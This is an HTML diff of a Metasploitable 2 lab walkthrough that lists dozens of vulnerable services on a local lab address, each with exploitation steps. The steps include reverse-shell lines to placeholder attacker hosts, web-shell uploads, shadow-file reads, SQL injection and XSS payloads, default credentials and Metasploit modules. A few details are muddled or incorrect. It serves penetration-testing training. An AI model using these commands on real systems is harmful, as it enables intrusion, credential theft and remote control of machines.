@@ -1,224 +1,1397 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>DRAK24EVIL | Bug Hunting Panel</title>
-
-<style>
-body{
-    background:#0d1117;
-    color:#c9d1d9;
-    font-family:Arial;
-    margin:0;
-}
-
-header{
-    background:#161b22;
-    padding:15px;
-    text-align:center;
-    border-bottom:2px solid #00ff99;
-}
-
-h1{margin:0;color:#00ff99;}
-
-.container{
-    padding:20px;
-    max-width:1100px;
-    margin:auto;
-}
-
-.card{
-    background:#161b22;
-    padding:15px;
-    margin-bottom:15px;
-    border-radius:8px;
-    border-left:5px solid #00ff99;
-}
-
-.title{
-    font-size:18px;
-    font-weight:bold;
-    color:#58a6ff;
-}
-
-.section{
-    margin-top:10px;
-}
-
-.label{
-    color:#00ff99;
-    font-size:12px;
-}
-
-.code{
-    background:#000;
-    padding:10px;
-    border-radius:5px;
-    margin-top:5px;
-    font-family:monospace;
-    color:#00ff99;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Metasploitable 2 Vulnerability Report by  Telugu Hacks Team </title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 900px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; }
+        h1 { color: #2c3e50; border-bottom: 2px solid #2c3e50; padding-bottom: 10px; }
+        .vuln-card { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .vuln-title { color: #c0392b; font-size: 1.4em; font-weight: bold; margin-bottom: 10px; }
+        .tag { display: inline-block; background: #2c3e50; color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 0.85em; margin-right: 5px; }
+        pre { background: #272822; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', Courier, monospace; }
+        .critical { border-left: 5px solid #ff0000; }
+        .high { border-left: 5px solid #ff6600; }
+    </style>
 </head>
-
 <body>
 
-<header>
-<h1>DRAK24EVIL BUG HUNTING PANEL</h1>
-<p>28 Vulnerabilities Loaded</p>
-</header>
+    <h1>Security Assessment:  Local Lab Metasploitable 2  </h1>
+    <center> 
+         <a href="https://t.me/teluguhackersgroup1"> <p> Telugu Hacks Team </p> </a>
 
-<div class="container" id="app"></div>
+</center>
+    <div class="vuln-card critical">
+        <div class="vuln-title">1. VSFTPD 2.3.4 Backdoor (Port 21)</div>
+        <span class="tag">RCE</span> <span class="tag">Backdoor</span> <span class="tag">Root Shell</span>
+        
+        <h3>## Summary:</h3>
+        <p>A malicious backdoor was introduced into the vsftpd-2.3.4.tar.gz archive. If a username ends with <code>:)</code>, a shell listener is triggered on port 6200.</p>
 
-<script>
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect to FTP: <code>telnet 192.168.99.131 21</code></li>
+            <li>Send Username: <code>USER backdoored:)</code></li>
+            <li>Send Password: <code>PASS anypass</code></li>
+            <li>Connect to the shell using Netcat: <code>nc -nv 192.168.99.131 6200</code></li>
+        </ol>
 
-const vulns = [
-
-{t:"vsftpd Backdoor",d:"FTP backdoor allows shell access",
-s:"1. Connect FTP\n2. Use user:)\n3. Shell opens",
-i:"Full Root Access",e:"exploit/unix/ftp/vsftpd"},
-
-{t:"SSH Brute Force",d:"Weak password attack",
-s:"1. Run Hydra\n2. Crack password",
-i:"Login Access",e:"hydra ssh"},
-
-{t:"Telnet Default",d:"Default credentials used",
-s:"1. telnet target\n2. login default",
-i:"User Access",e:"telnet"},
-
-{t:"SMTP Enumeration",d:"Usernames leaked",
-s:"1. Run enum\n2. find users",
-i:"Info Leak",e:"smtp-user-enum"},
-
-{t:"DNS Zone Transfer",d:"Full DNS leak",
-s:"1. dig axfr",
-i:"Network Map",e:"dig axfr"},
-
-{t:"PHP RCE",d:"Execute commands via PHP",
-s:"1. exploit CGI",
-i:"Server Control",e:"php exploit"},
-
-{t:"RPC Leak",d:"Service discovery",
-s:"1. rpcinfo",
-i:"Recon",e:"rpcinfo"},
-
-{t:"Samba RCE",d:"Remote code execution",
-s:"1. exploit samba",
-i:"Root",e:"samba exploit"},
-
-{t:"SMB Null Session",d:"Anonymous login",
-s:"1. enum4linux",
-i:"Data Leak",e:"enum4linux"},
-
-{t:"Rexec Trust",d:"No auth login",
-s:"1. rlogin root",
-i:"Root Access",e:"rlogin"},
-
-{t:"Rlogin Access",d:"Trust exploit",
-s:"1. rlogin",
-i:"Shell",e:"rlogin"},
-
-{t:"Rsh Exec",d:"Command execution",
-s:"1. rsh command",
-i:"Exec",e:"rsh"},
-
-{t:"Java RMI RCE",d:"Remote execution",
-s:"1. exploit RMI",
-i:"App Control",e:"rmi exploit"},
-
-{t:"Bind Shell",d:"Open shell",
-s:"1. nc connect",
-i:"Root",e:"nc target 1524"},
-
-{t:"NFS Leak",d:"File access",
-s:"1. mount share",
-i:"Data Leak",e:"mount"},
-
-{t:"ProFTPD Backdoor",d:"FTP exploit",
-s:"1. exploit ftp",
-i:"Root",e:"proftpd exploit"},
-
-{t:"MySQL No Password",d:"No auth DB",
-s:"1. login mysql",
-i:"DB Access",e:"mysql"},
-
-{t:"Distccd RCE",d:"Exec via distcc",
-s:"1. exploit distcc",
-i:"Exec",e:"distcc"},
-
-{t:"Postgres UDF",d:"SQL execution",
-s:"1. exploit postgres",
-i:"OS Access",e:"postgres exploit"},
-
-{t:"VNC No Auth",d:"Remote desktop",
-s:"1. connect vnc",
-i:"Desktop Access",e:"vncviewer"},
-
-{t:"UnrealIRCd Backdoor",d:"IRC exploit",
-s:"1. exploit irc",
-i:"Root",e:"irc exploit"},
-
-{t:"TikiWiki RCE",d:"Web exec",
-s:"1. exploit tiki",
-i:"Web Control",e:"tiki exploit"},
-
-{t:"Tomcat Deploy",d:"Upload WAR",
-s:"1. deploy shell",
-i:"Shell Access",e:"tomcat exploit"},
-
-{t:"SQL Injection",d:"Database attack",
-s:"1. run sqlmap",
-i:"Full DB",e:"sqlmap"},
-
-{t:"XSS",d:"Script injection",
-s:"1. inject script",
-i:"Cookie Theft",e:"<script>alert(1)</script>"},
-
-{t:"LFI",d:"File read",
-s:"1. ../../etc/passwd",
-i:"Info Leak",e:"../../etc/passwd"},
-
-{t:"Command Injection",d:"Execute OS commands",
-s:"1. use ;",
-i:"System Control",e:"; id"},
-
-{t:"WebDAV Upload",d:"Upload shell",
-s:"1. upload file",
-i:"Webshell",e:"cadaver"}
-
-];
-
-const app = document.getElementById("app");
-
-vulns.forEach(v=>{
-    app.innerHTML += `
-    <div class="card">
-        <div class="title">${v.t}</div>
-
-        <div class="section">
-            <div class="label">Description</div>
-            ${v.d}
-        </div>
-
-        <div class="section">
-            <div class="label">Steps</div>
-            ${v.s}
-        </div>
-
-        <div class="section">
-            <div class="label">Impact</div>
-            ${v.i}
-        </div>
-
-        <div class="section">
-            <div class="label">Exploit PoC</div>
-            <div class="code">${v.e}</div>
-        </div>
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>Exploit-DB ID: 17491</li>
+            <li>CVE-2011-2523</li>
+        </ul>
     </div>
-    `;
-});
 
-</script>
+    <div class="vuln-card critical">
+        <div class="vuln-title">2. Ingreslock Bind Shell (Port 1524)</div>
+        <span class="tag">Misconfiguration</span> <span class="tag">Legacy</span>
+        
+        <h3>## Summary:</h3>
+        <p>This is a "legacy" backdoor. On many older Unix systems, port 1524 was often used to provide a root shell listener for administrative recovery, left open by default here.</p>
 
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Netcat to connect directly to the port:</li>
+            <pre>nc -nv 192.168.99.131 1524</pre>
+            <li>You will immediately see a root prompt (<code>#</code>).</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>Commonly used in CTF environments to demonstrate poor default configurations.</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">3. UnrealIRCd 3.2.8.1 Backdoor (Port 6667)</div>
+        <span class="tag">RCE</span> <span class="tag">IRC</span>
+        
+        <h3>## Summary:</h3>
+        <p>This version of the IRC daemon contains a Trojan horse that allows remote command execution by sending a string starting with "AB;".</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect to port 6667 via Netcat.</li>
+            <li>Send the payload string: <code>AB; [command]</code></li>
+            <li>Example for a reverse shell: <br>
+                <code>AB; /bin/bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1</code>
+            </li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2010-2075</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">4. Distcc Distributed Compiler RCE (Port 3632)</div>
+        <span class="tag">Code Execution</span>
+        
+        <h3>## Summary:</h3>
+        <p>The distcc service does not verify the commands it is asked to run. Attackers can abuse this to execute arbitrary code on the server.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use the Nmap script to verify:</li>
+            <pre>nmap -p 3632 192.168.99.131 --script distcc-cve2004-2687</pre>
+            <li>Execute commands via a specialized exploit script or Metasploit.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2004-2687</li>
+        </ul>
+    </div>
+    
+    <div class="vuln-card critical">
+        <div class="vuln-title">5. Samba "username map script" RCE (Port 139/445)</div>
+        <span class="tag">RCE</span> <span class="tag">Samba</span> <span class="tag">Root Access</span>
+        
+        <h3>## Summary:</h3>
+        <p>This is one of the most reliable exploits on Metasploitable 2. The Samba configuration allows remote command execution by including shell metacharacters in the username field during the login process.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>Netcat</b> or <b>Metasploit</b> to target the SMB service.</li>
+            <li>In Metasploit: <code>use exploit/multi/samba/usermap_script</code></li>
+            <li>Set RHOSTS to <code>192.168.99.131</code> and execute <code>exploit</code>.</li>
+            <li><b>Manual Payload:</b> Using an SMB client, attempt login with a username like: <code>/=`nohup nc -e /bin/sh ATTACKER_IP PORT`</code></li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2007-2447</li>
+            <li>Impact: Full system compromise as the 'root' user.</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">6. Java RMI Server Insecure Default Configuration (Port 1099)</div>
+        <span class="tag">RCE</span> <span class="tag">Java</span>
+        
+        <h3>## Summary:</h3>
+        <p>The Java Remote Method Invocation (RMI) service is misconfigured to allow the loading of arbitrary classes from remote URLs. This allows an attacker to execute Java code remotely on the server.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Identify the service using Nmap: <code>nmap -sV -p 1099 192.168.99.131</code></li>
+            <li>Use Metasploit: <code>use exploit/multi/misc/java_rmi_server</code></li>
+            <li>Set the target IP and run. The payload will be delivered via an HTTP server automatically started by the exploit.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2011-3556</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">7. NFS Unrestricted Root Export (Port 2049)</div>
+        <span class="tag">Data Leak</span> <span class="tag">Broken Access Control</span>
+        
+        <h3>## Summary:</h3>
+        <p>The Network File System (NFS) is configured to export the entire root directory (<code>/</code>) to any system that requests it. This allows anyone to mount the target's hard drive and read/write any file, including sensitive system files.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Check exports from your Kali machine: <code>showmount -e 192.168.99.131</code></li>
+            <li>Create a local directory: <code>mkdir /tmp/victim_root</code></li>
+            <li>Mount the target: <code>mount -t nfs 192.168.99.131:/ /tmp/victim_root</code></li>
+            <li>You now have full access. For example: <code>cat /tmp/victim_root/etc/shadow</code></li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>Misconfiguration: <code>/ * (rw,no_root_squash)</code> in <code>/etc/exports</code></li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">8. MySQL Insecure 'root' Account (Port 3306)</div>
+        <span class="tag">Database</span> <span class="tag">Information Disclosure</span>
+        
+        <h3>## Summary:</h3>
+        <p>The MySQL database is configured to allow the 'root' user to connect from any remote host without requiring a password.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Attempt to connect directly using the MySQL client:</li>
+            <pre>mysql -u root -h 192.168.99.131</pre>
+            <li>Once connected, you can dump database tables or use <code>SELECT ... INTO OUTFILE</code> to write web shells to the <code>/var/www</code> directory.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>OWASP: Insufficient Logging and Monitoring / Insecure Defaults.</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">9. PostgreSQL Default Credentials (Port 5432)</div>
+        <span class="tag">Database</span> <span class="tag">RCE</span>
+        
+        <h3>## Summary:</h3>
+        <p>The PostgreSQL service uses the default credentials <code>postgres:postgres</code>. Attackers can log in and use the <code>COPY FROM PROGRAM</code> command or Metasploit modules to execute OS commands.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Login: <code>psql -h 192.168.99.131 -U postgres</code></li>
+            <li>When prompted for password, enter <code>postgres</code>.</li>
+            <li>Use Metasploit for a shell: <code>use exploit/linux/postgres/postgres_payload</code></li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2013-1899</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">10. VNC Weak Password "password" (Port 5900)</div>
+        <span class="tag">Remote Desktop</span> <span class="tag">Weak Auth</span>
+        
+        <h3>## Summary:</h3>
+        <p>The Virtual Network Computing (VNC) service allows remote GUI access. On this machine, it is secured with the very weak password <code>password</code>.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use a VNC viewer to connect: <code>vncviewer 192.168.99.131</code></li>
+            <li>When prompted for the password, type: <code>password</code></li>
+            <li>You will gain a remote desktop session on the Metasploitable machine.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">11. Telnet Default Credentials (Port 23)</div>
+        <span class="tag">Cleartext</span> <span class="tag">Weak Auth</span>
+        
+        <h3>## Summary:</h3>
+        <p>Telnet is an insecure protocol that sends data in cleartext. Additionally, this instance accepts the default system credentials <code>msfadmin:msfadmin</code>.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect via terminal: <code>telnet 192.168.99.131</code></li>
+            <li>Login with username <code>msfadmin</code> and password <code>msfadmin</code>.</li>
+        </ol>
+    </div>
+    
+    <div class="vuln-card critical">
+        <div class="vuln-title">12. PHP CGI Argument Injection (Port 80)</div>
+        <span class="tag">RCE</span> <span class="tag">Web</span> <span class="tag">PHP</span>
+        
+        <h3>## Summary:</h3>
+        <p>When PHP is run as a CGI, it can be tricked into interpreting query string arguments as command-line arguments. This allows an attacker to enable 'allow_url_include' and execute remote code.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Target the URL: <code>http://192.168.99.131/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></li>
+            <li>Send a POST request to this URL with the body: <code>&lt;?php system('whoami'); ?&gt;</code></li>
+            <li><b>Result:</b> The server will return 'www-data' or 'root', confirming code execution.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2012-1823</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">13. phpMyAdmin Insecure "root" Login (Port 80)</div>
+        <span class="tag">Database</span> <span class="tag">Web Admin</span>
+        
+        <h3>## Summary:</h3>
+        <p>The phpMyAdmin interface is accessible at <code>/phpMyAdmin/</code> and allows the 'root' user to log in with no password. This gives full control over all databases.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to <code>http://192.168.99.131/phpMyAdmin/</code></li>
+            <li>Username: <code>root</code> | Password: (Leave Blank)</li>
+            <li>Once inside, use the "SQL" tab to run: <code>SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/shell.php';</code></li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>Impact: Full Database Access and Web Shell upload.</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">14. DVWA Command Injection (Port 80)</div>
+        <span class="tag">Injection</span> <span class="tag">Web App</span>
+        
+        <h3>## Summary:</h3>
+        <p>The "Damn Vulnerable Web Application" (DVWA) includes a ping tool that does not sanitize user input. By using shell metacharacters like <code>;</code> or <code>&&</code>, you can execute OS commands.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to DVWA and log in (admin:password).</li>
+            <li>Go to "Command Injection" page.</li>
+            <li>Enter: <code>127.0.0.1; cat /etc/passwd</code></li>
+            <li><b>Result:</b> The system displays the contents of the password file below the ping results.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">15. Mutillidae SQL Injection (Port 80)</div>
+        <span class="tag">SQLi</span> <span class="tag">Authentication Bypass</span>
+        
+        <h3>## Summary:</h3>
+        <p>The login page in Mutillidae is vulnerable to classic SQL injection. An attacker can log in as the first user in the database (usually admin) without a valid password.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to the Mutillidae Login page.</li>
+            <li>Username: <code>' OR 1=1 -- </code></li>
+            <li>Password: (Anything)</li>
+            <li><b>Result:</b> You are logged in as the administrative user.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>OWASP Top 10: A03:2021 – Injection</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">16. Anonymous FTP Writeable Directory (Port 21)</div>
+        <span class="tag">Misconfiguration</span> <span class="tag">FTP</span>
+        
+        <h3>## Summary:</h3>
+        <p>The FTP server allows anonymous login and, more importantly, has directories with write permissions. This can be used to host malicious files or "warez".</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Login: <code>ftp 192.168.99.131</code> (User: <code>anonymous</code> Pass: <code>anonymous</code>)</li>
+            <li>Type: <code>ls -la</code> to find writeable folders.</li>
+            <li>Use <code>put exploit.php</code> to upload a file to the server.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">17. IRC SSL Bind Shell (Port 6697)</div>
+        <span class="tag">Backdoor</span> <span class="tag">Root Access</span>
+        
+        <h3>## Summary:</h3>
+        <p>Similar to port 6667, port 6697 runs an IRC service. On Metasploitable 2, this is often another entry point for the UnrealIRCd backdoor or a simple root bind shell.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Attempt connection: <code>nc -nv 192.168.99.131 6697</code></li>
+            <li>If it hangs, try the <code>AB;</code> payload mentioned in item #3.</li>
+        </ol>
+    </div>
+    <div class="vuln-card critical">
+        <div class="vuln-title">18. Samba Trans2open Buffer Overflow (Port 139)</div>
+        <span class="tag">Buffer Overflow</span> <span class="tag">RCE</span>
+        
+        <h3>## Summary:</h3>
+        <p>This is a classic memory corruption vulnerability in the Samba <code>trans2open</code> function. It allows an attacker to overwrite memory and redirect execution to a payload.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Metasploit: <code>use exploit/linux/samba/trans2open</code></li>
+            <li>Set the PAYLOAD to <code>linux/x86/shell_reverse_tcp</code></li>
+            <li>Execute <code>exploit</code> to gain a root shell.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2003-0201</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">19. TikiWiki 1.9.8 'unserialize' RCE (Port 80)</div>
+        <span class="tag">PHP Deserialization</span> <span class="tag">Web</span>
+        
+        <h3>## Summary:</h3>
+        <p>The TikiWiki application hosted on the machine contains a vulnerability in how it handles serialized data, leading to arbitrary command execution.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Navigate to: <code>http://192.168.99.131/tikiwiki/</code></li>
+            <li>Use Metasploit: <code>use exploit/multi/http/tikiwiki_graph_formula_exec</code></li>
+            <li>Set RHOSTS and run to get a <code>www-data</code> shell.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2007-5423</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">20. Apache Tomcat Manager Default Credentials (Port 8180)</div>
+        <span class="tag">Authentication Bypass</span> <span class="tag">Web Shell</span>
+        
+        <h3>## Summary:</h3>
+        <p>The Apache Tomcat server running on port 8180 has the "Manager" application enabled with default credentials <code>tomcat:tomcat</code>. This allows for the deployment of malicious WAR files.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Go to <code>http://192.168.99.131:8180/manager/html</code></li>
+            <li>Login with <code>tomcat</code> / <code>tomcat</code>.</li>
+            <li>Upload a custom WAR web shell to gain full control of the web server.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">21. Distributed Ruby (drb) Remote Code Execution (Port 8787)</div>
+        <span class="tag">Ruby</span> <span class="tag">RCE</span>
+        
+        <h3>## Summary:</h3>
+        <p>The Ruby Distributed (drb) service allows remote clients to call methods on Ruby objects. It can be abused to execute arbitrary system commands.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Metasploit: <code>use exploit/linux/ids/snort_unserialize</code> (Note: specifically the drb exploit <code>exploit/linux/misc/drb_remote_codeexec</code>).</li>
+            <li>Execute to get a shell running as the user starting the service.</li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>CVE-2011-0739</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">22. X11 Unauthenticated Desktop Access (Port 6000)</div>
+        <span class="tag">Information Leak</span> <span class="tag">GUI</span>
+        
+        <h3>## Summary:</h3>
+        <p>The X11 windowing system is configured to allow any remote host to connect. An attacker can use this to capture keystrokes (keylogging) or take screenshots of the victim's desktop.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <code>xwatchwin</code> or <code>xwd</code> to capture the screen.</li>
+            <li>Command: <code>xwd -root -display 192.168.99.131:0 -out screen.xwd</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">23. Insecure "R" Services (Ports 512-514)</div>
+        <span class="tag">Legacy</span> <span class="tag">Weak Auth</span>
+        
+        <h3>## Summary:</h3>
+        <p>These legacy remote services are inherently insecure as they transmit data in cleartext and rely on "trusted hosts" for authentication rather than strong passwords.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Try logging in without a password: <code>rlogin -l root 192.168.99.131</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">24. SMTP VRFY User Enumeration (Port 25)</div>
+        <span class="tag">Recon</span> <span class="tag">Enumeration</span>
+        
+        <h3>## Summary:</h3>
+        <p>The SMTP service allows the <code>VRFY</code> command, which can be used to check if a specific username exists on the system.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Connect: <code>nc -nv 192.168.99.131 25</code></li>
+            <li>Type: <code>VRFY root</code></li>
+            <li>If it returns <code>252</code>, the user exists.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">25. BIND DNS Version Fingerprinting (Port 53)</div>
+        <span class="tag">Recon</span> <span class="tag">Fingerprint</span>
+        
+        <h3>## Summary:</h3>
+        <p>The DNS service allows remote users to query its version, which helps an attacker find specific exploits for that version.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Command: <code>dig @192.168.99.131 version.bind CHAOS TXT</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">26. SSH Weak Encryption Algorithms</div>
+        <span class="tag">Encryption</span> <span class="tag">SSH</span>
+        
+        <h3>## Summary:</h3>
+        <p>The SSH service supports older, weaker encryption algorithms and MACs that are susceptible to theoretical attacks.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <code>ssh-audit</code> or <code>nmap --script ssh2-enum-algos</code> to list weak ciphers.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">27. RPCBind / Portmapper Enumeration (Port 111)</div>
+        <span class="tag">Recon</span> <span class="tag">RPC</span>
+        
+        <h3>## Summary:</h3>
+        <p>The portmapper service lists all available RPC services on the machine, giving the attacker a roadmap of potential targets.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Command: <code>rpcinfo -p 192.168.99.131</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">28. TWiki (Not TikiWiki) RCE (Port 80)</div>
+        <span class="tag">RCE</span> <span class="tag">Web</span>
+        
+        <h3>## Summary:</h3>
+        <p>TWiki (separate from TikiWiki) has a vulnerability in its search function that allows command injection.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Metasploit: <code>use exploit/unix/webapp/twiki_search</code></li>
+        </ol>
+    </div>
+
+    <div class="vuln-card high">
+        <div class="vuln-title">29. PHPMyAdmin 'setup.php' Code Injection</div>
+        <span class="tag">RCE</span> <span class="tag">PHP</span>
+        
+        <h3>## Summary:</h3>
+        <p>The setup script for phpMyAdmin allows an attacker to inject PHP code into a configuration file.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Metasploit: <code>use exploit/unix/webapp/phpmyadmin_setup_config</code></li>
+        </ol>
+        <h3>## Supporting Material/References:</h3>
+        <ul><li>CVE-2009-1151</li></ul>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">30. Linux Kernel UDEV Local Privilege Escalation</div>
+        <span class="tag">PrivEsc</span> <span class="tag">Kernel</span>
+        
+        <h3>## Summary:</h3>
+        <p>Once you have a low-privilege shell (like <code>www-data</code>), you can exploit the UDEV service to gain root access.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Check kernel version: <code>uname -a</code></li>
+            <li>Use exploit for CVE-2009-1185.</li>
+        </ol>   
+        <div class="vuln-card high">
+        <div class="vuln-title">31. WebDAV Insecure "PUT" Method (Port 80)</div>
+        <span class="tag">WebDAV</span> <span class="tag">Web Shell</span>
+        
+        <h3>## Summary:</h3>
+        <p>The WebDAV extension on the Apache server is misconfigured to allow the <code>PUT</code> and <code>MOVE</code> methods without authentication in certain directories (like <code>/dav/</code>).</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use <b>Cadaver</b> or <b>Curl</b> to upload a shell:</li>
+            <pre>curl -X PUT http://192.168.99.131/dav/shell.php -d "&lt;?php system($_GET['cmd']); ?&gt;"</pre>
+            <li>Access your shell: <code>http://192.168.99.131/dav/shell.php?cmd=id</code></li>
+        </ol>
+
+        <h3>## Supporting Material/References:</h3>
+        <ul>
+            <li>OWASP: Insecure Web Server Configuration</li>
+        </ul>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">32. PHP PDF Library (dompdf) RCE (Port 80)</div>
+        <span class="tag">RCE</span> <span class="tag">File Inclusion</span>
+        
+        <h3>## Summary:</h3>
+        <p>Older versions of the <b>dompdf</b> library (often found in <code>/dvwa/external/phpids/</code>) allow remote file inclusion by pointing the library to a malicious CSS file containing PHP code.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Locate the <code>dompdf.php</code> file.</li>
+            <li>Craft a URL that uses the <code>input_file</code> parameter to load a remote resource.</li>
+            <li>Use Metasploit: <code>use exploit/multi/http/dompdf_rce</code></li>
+        </ol>
+        <h3>## Supporting Material/References:</h3>
+        <ul><li>CVE-2014-2383</li></ul>
+    </div>
+
+    <div class="vuln-card medium">
+        <div class="vuln-title">33. Mutillidae Stored XSS (Port 80)</div>
+        <span class="tag">XSS</span> <span class="tag">Stored</span>
+        
+        <h3>## Summary:</h3>
+        <p>The user profile page in Mutillidae does not sanitize the "Signature" or "Username" fields, allowing an attacker to store JavaScript that executes in the browser of any user viewing the profile.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Register or Edit Profile in Mutillidae.</li>
+            <li>In the signature field, enter: <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code></li>
+            <li><b>Result:</b> Every time the profile is viewed, the script triggers.</li>
+        </ol>
+    </div>
+
+    <div class="vuln-card critical">
+        <div class="vuln-title">34. Samba LSA RPC Buffer Overflow (Port 445)</div>
+        <span class="tag">Memory Corruption</span> <span class="tag">Samba</span>
+        
+        <h3>## Summary:</h3>
+        <p>A heap-based buffer overflow in the LSA RPC service of Samba allows remote attackers to execute arbitrary code via a crafted office request.</p>
+
+        <h3>## Steps To Reproduce:</h3>
+        <ol>
+            <li>Use Metasploit: <code>use exploit/linux/samba/lsa_transnames_heap</code></li>
+            <li>Target the SMB service on <code>192.168.99.131</code>.</li>
+        </ol>
+        <h3>## Supporting Material/References:</h3>
+        <ul><li>CVE-2007-2446</li></ul>
+    </div>
+
+    <div class="vuln-card low">
+        <div class="vuln-title">35. Apache mod_isapi Header Disclosure (Port 80)</div>
+        <span class="tag">Info Leak</span> <span class="tag">Fingerprinting</span>
+        
+        <h3>## Summary:</h3>
